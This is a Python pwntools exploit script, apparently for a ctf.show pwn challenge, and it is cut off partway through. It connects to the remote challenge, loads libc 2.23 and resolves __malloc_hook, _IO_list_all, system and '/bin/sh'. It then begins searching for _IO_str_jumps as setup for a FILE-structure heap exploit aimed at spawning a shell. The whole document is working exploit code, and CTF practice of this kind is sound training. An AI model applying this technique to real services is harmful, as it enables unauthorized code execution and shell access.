from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28175)
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
malloc_hook_s = libc.symbols['__malloc_hook']
_IO_list_all_s = libc.symbols['_IO_list_all']
system_s = libc.sym['system']
binsh_s = libc.search('/bin/sh').next()
    
def get_IO_str_jumps():
    IO_file_jumps_offset = libc.sym['_IO_file_jumps']
    IO_str_underflow_offset = libc.sym['_IO_str_underflow']
    for ref_offset in libc.search(p64(IO_str_underflow_offset)):
        possible_IO_str_jumps_offset = ref_offset - 0x20
